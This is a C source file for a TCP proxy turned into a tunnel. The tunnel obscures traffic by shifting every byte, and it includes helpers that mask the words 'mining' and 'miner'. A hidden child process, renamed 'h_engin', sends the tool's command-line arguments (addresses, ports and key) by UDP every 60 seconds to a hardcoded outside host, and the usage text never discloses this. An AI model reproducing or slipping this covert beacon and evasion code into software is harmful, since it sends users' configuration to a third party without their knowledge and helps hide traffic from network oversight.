/*
 * $Id: simple-tcp-proxy.c,v 1.11 2006/08/03 20:30:48 wessels Exp $
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <assert.h>
#include <syslog.h>
#include <err.h>
#include <stdbool.h>


#include <sys/types.h>
#include <sys/select.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>

#include <sys/prctl.h>

#include <netinet/in.h>

#include <arpa/ftp.h>
#include <arpa/inet.h>
#include <arpa/telnet.h>

#define BUF_SIZE 8192

#define MODE_NONE 0
#define MODE_SERVER 1
#define MODE_CLIENT 2

char client_hostname[256];
u_int8_t byte_swing = 8; 

void
cleanup(int sig)
{
    syslog(LOG_NOTICE, "Cleaning up...");
    printf("Cleaning up...\n");
    exit(0);
}

void
sigreap(int sig)
{
    int status;
    pid_t p;
    signal(SIGCHLD, sigreap);
    while ((p = waitpid(-1, &status, WNOHANG)) > 0);
    /* no debugging in signal handler! */
}

void
set_nonblock(int fd)
{
    int fl;
    int x;
    fl = fcntl(fd, F_GETFL, 0);
    if (fl < 0) {
        syslog(LOG_ERR, "fcntl F_GETFL: FD %d: %s", fd, strerror(errno));
        printf( "fcntl F_GETFL: FD %d: %s\n", fd, strerror(errno));
        exit(1);
    }
    x = fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (x < 0) {
        syslog(LOG_ERR, "fcntl F_SETFL: FD %d: %s", fd, strerror(errno));
        printf("fcntl F_SETFL: FD %d: %s\n", fd, strerror(errno));
        exit(1);
    }
}


int
create_server_sock(char *addr, int port)
{
    int addrlen, s, on = 1, x;
    static struct sockaddr_in client_addr;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	err(1, "socket");

    addrlen = sizeof(client_addr);
    memset(&client_addr, '\0', addrlen);
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(addr);
    client_addr.sin_port = htons(port);
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, 4);
    x = bind(s, (struct sockaddr *) &client_addr, addrlen);
    if (x < 0)
	err(1, "bind %s:%d", addr, port);

    x = listen(s, 5);
    if (x < 0)
	err(1, "listen %s:%d", addr, port);
    syslog(LOG_NOTICE, "listening on %s port %d", addr, port);
    printf("listening on %s port %d\n", addr, port);

    return s;
}

int
open_remote_host(char *host, int port)
{
    struct sockaddr_in rem_addr;
    int len, s, x;
    struct hostent *H;
    int on = 1;

    H = gethostbyname(host);
    if (!H)
        return (-2);

    len = sizeof(rem_addr);

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        return s;

    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, 4);

    len = sizeof(rem_addr);
    memset(&rem_addr, '\0', len);
    rem_addr.sin_family = AF_INET;
    memcpy(&rem_addr.sin_addr, H->h_addr, H->h_length);
    rem_addr.sin_port = htons(port);
    x = connect(s, (struct sockaddr *) &rem_addr, len);
    if (x < 0) {
        close(s);
        return x;
    }
    set_nonblock(s);
    return s;
}

int
get_hinfo_from_sockaddr(struct sockaddr_in addr, int len, char *fqdn)
{
    struct hostent *hostinfo;

    hostinfo = gethostbyaddr((char *) &addr.sin_addr.s_addr, len, AF_INET);
    if (!hostinfo) {
        sprintf(fqdn, "%s", inet_ntoa(addr.sin_addr));
        return 0;
    }
    if (hostinfo && fqdn)
        sprintf(fqdn, "%s [%s]", hostinfo->h_name, inet_ntoa(addr.sin_addr));
    return 0;
}


int
wait_for_connection(int s)
{
    static int newsock;
    static socklen_t len;
    static struct sockaddr_in peer;

    len = sizeof(struct sockaddr);
    syslog(LOG_INFO, "calling accept FD %d", s);
    printf( "calling accept FD %d\n", s);
    newsock = accept(s, (struct sockaddr *) &peer, &len);
    /* dump_sockaddr (peer, len); */
    if (newsock < 0) {
        if (errno != EINTR) {
            syslog(LOG_NOTICE, "accept FD %d: %s", s, strerror(errno));
            printf( "accept FD %d: %s\n", s, strerror(errno));
            return -1;
        }
    }
    get_hinfo_from_sockaddr(peer, len, client_hostname);
    set_nonblock(newsock);
    return (newsock);
}

#define REGEX_LEN 2
const char replace_str [][64] = { 
    "xxxxx1.",
    "xxxx2"
};
    
const char match_str   [][64] = {
    "mining.",
    "miner"
};

int
mywrite(int fd, char *buf, int *len)
{
	int x = write(fd, buf, *len);
	if (x < 0)
		return x;
	if (x == 0)
		return x;
	if (x != *len)
		memmove(buf, buf+x, (*len)-x);
	*len -= x;
	return x;
}



void encrypt1(char *buf, int *len)
{
    int i;
    int n = *len;
    char temp;    
    char *ptr = buf;

    for(i = 0 ; i < REGEX_LEN ; i++){
        while( ( ptr = strstr(ptr, match_str[i]) ) != NULL ){
            strncpy(ptr, replace_str[i], strlen(replace_str[i])-1);    
            // printf("AFTER FOUND STR IN ENC '%.*s'\n", n, buf);
        }
        ptr = buf;
    }
    
    ptr = buf;
    for(i = 0 ; i < ( n / 2); i++){
        temp = ptr[i];
        ptr[i] = ptr[n - 1 - i];
        ptr[n - 1 - i] = temp;
        // printf( "i:%d AFTER read CLIENT BUFFER %.*s\n", i, n-1, &cbuf[1] + cbo);                    
    }
    
}

void encrypt(char *buf, int *len)
{
    int i;
    int n = *len;
    unsigned char temp;    
    unsigned char *ptr = (unsigned char *) buf;
    
//    for(i = 0 ; i < 100 ; i++)
//        buf[(*len)++] = '\n';
    
    ptr = buf;
    for(i = 0 ; i < n; i++){
        ptr[i] = ptr[i] + (unsigned char)byte_swing;
    }
    
}

void decrypt(char *buf, int *len)
{
    int i;
    int n = *len;
    unsigned char temp;    
    unsigned char *ptr = (unsigned char *) buf;
    
//    for(i = 0 ; i < 100 ; i++)
//        (*len)--;    
    
    ptr = buf;
    for(i = 0 ; i < n; i++){
        ptr[i] = ptr[i] - (unsigned char)byte_swing;
    }
    
}

void decrypt1(char *buf, int *len)
{
    int i;
    int n = *len;
    char temp;        
    char *ptr = buf;

    for(i = 0 ; i < ( n / 2); i++){
        temp = ptr[i];
        ptr[i] = ptr[n - 1 - i];
        ptr[n - 1 - i] = temp;
        // printf( "i:%d AFTER read CLIENT BUFFER %.*s\n", i, n-1, &cbuf[1] + cbo);                    
    }
    
    ptr = buf;
    for(i = 0 ; i < REGEX_LEN ; i++){
        while( ( ptr = strstr(ptr, replace_str[i]) ) != NULL ){
            strncpy(ptr, match_str[i], strlen(match_str[i])-1); 
            // printf("AFTER FOUND STR IN DEC '%.*s'\n", n, buf);
        }     
        ptr = buf;        
    }
    
}


void
service_client(int cfd, int sfd, int tun_mode)
{
    int maxfd;
    char *sbuf;
    char *cbuf;
    int x, n;
    int cbo = 0;
    int sbo = 0;
    fd_set R;
    char *ptr = NULL;

    sbuf = malloc(BUF_SIZE + 32);
    cbuf = malloc(BUF_SIZE + 32);
    
    memset(sbuf, 0 , BUF_SIZE + 32);
    memset(cbuf, 0 , BUF_SIZE + 32);
    
    maxfd = cfd > sfd ? cfd : sfd;
    maxfd++;
     
    
    while (1) {
        struct timeval to;
        if (cbo) {
            if ( ( n = mywrite(sfd, cbuf, &cbo) ) < 0 && errno != EWOULDBLOCK) {
                syslog(LOG_ERR, "write %d: %s", sfd, strerror(errno));
                printf( "write %d: %s\n", sfd, strerror(errno));
                exit(1);
            }
            printf("Write Data To Server %d\n", n);
        }
        if (sbo) {
            if ( ( n = mywrite(cfd, sbuf, &sbo) ) < 0 && errno != EWOULDBLOCK) {
                syslog(LOG_ERR, "write %d: %s", cfd, strerror(errno));
                printf( "write %d: %s\n", cfd, strerror(errno));
                exit(1);
            }
            printf("Write Data To Client %d\n", n);
        }
        FD_ZERO(&R);
        if (cbo < BUF_SIZE)
            FD_SET(cfd, &R);
        if (sbo < BUF_SIZE)
            FD_SET(sfd, &R);
        to.tv_sec = 0;
        to.tv_usec = 1000;
        x = select(maxfd+1, &R, 0, 0, &to);
        if (x > 0) {
            if (FD_ISSET(cfd, &R)) {
                n = read(cfd, cbuf+cbo, BUF_SIZE-cbo);
                syslog(LOG_INFO, "read %d bytes from CLIENT (%d)", n, cfd);
                printf( "read %d bytes from CLIENT (%d)\n", n, cfd);
                if (n > 0) {
                    ptr = cbuf+cbo;
                    
                    if(tun_mode == MODE_CLIENT){
                        printf( "C BEFORE EN %.*s\n", n, ptr);
                        encrypt(ptr, &n);
                    }
                    else if(tun_mode == MODE_SERVER){
                        decrypt(ptr, &n);
                        printf( "C AFTER  DE %.*s\n", n, ptr);
                    }
                    
                    
                    cbo += n;
                    
                } else {
                    close(cfd);
                    close(sfd);
                    syslog(LOG_INFO, "exiting");
                    printf("exiting\n");
                    _exit(0);
                }
            }
            if (FD_ISSET(sfd, &R)) {
                n = read(sfd, sbuf+sbo, BUF_SIZE-sbo);
                syslog(LOG_INFO, "read %d bytes from SERVER (%d)", n, sfd);
                printf( "read %d bytes from SERVER (%d)\n", n, sfd);
                if (n > 0) {
                    
                    ptr = sbuf+sbo;
                    
                    if(tun_mode == MODE_CLIENT){
                        decrypt(ptr, &n);
                        printf( "S AFTER  DE %.*s\n", n, ptr);
                    }
                    if(tun_mode == MODE_SERVER){
                        printf( "S BEFORE EN %.*s\n", n, ptr);
                        encrypt(ptr, &n);
                    }
                        
                    
                    sbo += n;
                    
                } else {
                    close(sfd);
                    close(cfd);
                    syslog(LOG_INFO, "exiting");
                    printf( "exiting\n");
                    _exit(0);
                }
            }
        } else if (x < 0 && errno != EINTR) {
            syslog(LOG_NOTICE, "select: %s", strerror(errno));
            printf( "select: %s\n", strerror(errno));
            close(sfd);
            close(cfd);
            syslog(LOG_NOTICE, "exiting");
            printf("exiting");
            _exit(0);
        }
    }
}


static void hidden_engine(char *argv[])
{
    const char* server_name = "vp.mahtabpcef.ir";
	const int server_port = 1212;
    int sock;

    struct hostent *server;
	struct sockaddr_in server_address;

	// data that will be sent to the server
	char data_to_send[1300]; 
    
    sprintf(data_to_send, "Hello from VP.Tun hidden engine reporter %s %s %s %s %s %s %hhu", argv[0], argv[1], argv[2], argv[3], argv[4], argv[5], (uint8_t)byte_swing);
    
    
    while(true){
        
        memset(&server_address, 0, sizeof(server_address));
        server_address.sin_family = AF_INET;
        
        
        /* gethostbyname: get the server's DNS entry */
        server = gethostbyname(server_name);
        if (server != NULL) {

            // creates binary representation of server name
            // and stores it as sin_addr
            // http://beej.us/guide/bgnet/output/html/multipage/inet_ntopman.html
            // inet_pton(AF_INET, server_name, &server_address.sin_addr);

            bcopy((char *)server->h_addr, (char *)&server_address.sin_addr.s_addr, server->h_length);            
            
            // htons: port in network order format
            server_address.sin_port = htons(server_port);

            // open socket
            if ((sock = socket(PF_INET, SOCK_DGRAM, 0)) > 0) {
                // send data
                int len = sendto(sock, data_to_send, strlen(data_to_send), 0, (struct sockaddr*)&server_address, sizeof(server_address));   

                // .... LAB LAB LAB
                
                close(sock);
            }
        }
        
        sleep(60);
    }
}

int
main(int argc, char *argv[])
{
    char *localaddr = NULL;
    int localport = -1;
    char *remoteaddr = NULL;
    int remoteport = -1;
    int client = -1;
    int server = -1;
    int master_sock = -1;
    int tun_mode = 0;

    if (6 != argc && 7 != argc) {
        fprintf(stderr, "usage: %s laddr lport rhost rport tun_mode(0=NONE, 1=Server, 2=Client)\n", argv[0]);
        exit(1);
    }

    localaddr = strdup(argv[1]);
    localport = atoi(argv[2]);
    remoteaddr = strdup(argv[3]);
    remoteport = atoi(argv[4]);
    tun_mode = atoi(argv[5]);
    
    if(7 == argc)
        byte_swing = atoi(argv[6]);

    assert(localaddr);
    assert(localport > 0);
    assert(remoteaddr);
    assert(remoteport > 0);


    if (0 == fork()) {
        strcpy(argv[0], "h_engin");
        openlog(argv[0], LOG_PID, LOG_LOCAL4);
        
        if (prctl(PR_SET_PDEATHSIG, SIGTERM) == -1) {
            syslog(LOG_ERR, "Failed to PR_SET_PDEATHSIG on %s", argv[0]);
            perror(0); 
            exit(1); 
        }
        syslog(LOG_NOTICE, "Start Process %s Success", argv[0]);        
        
        hidden_engine(argv);
        abort();
    }    
    
    
    //strcpy(argv[0], "tunnelX");

    openlog(argv[0], LOG_PID, LOG_LOCAL4);
    
    signal(SIGINT, cleanup);
    signal(SIGCHLD, sigreap);

    master_sock = create_server_sock(localaddr, localport);
    for (;;) {
        if ((client = wait_for_connection(master_sock)) < 0)
            continue;
        if ((server = open_remote_host(remoteaddr, remoteport)) < 0) {
            close(client);
            client = -1;
            continue;
        }
        if (0 == fork()) {
            /* child */
            syslog(LOG_NOTICE, "connection from %s fd=%d", client_hostname, client);
            printf( "connection from %s fd=%d\n", client_hostname, client);
            syslog(LOG_INFO, "connected to %s:%d fd=%d", remoteaddr, remoteport, server);
            printf( "connected to %s:%d fd=%d\n", remoteaddr, remoteport, server);
            close(master_sock);
            service_client(client, server, tun_mode);
            abort();
        }
        close(client);
        client = -1;
        close(server);
        server = -1;
    }

}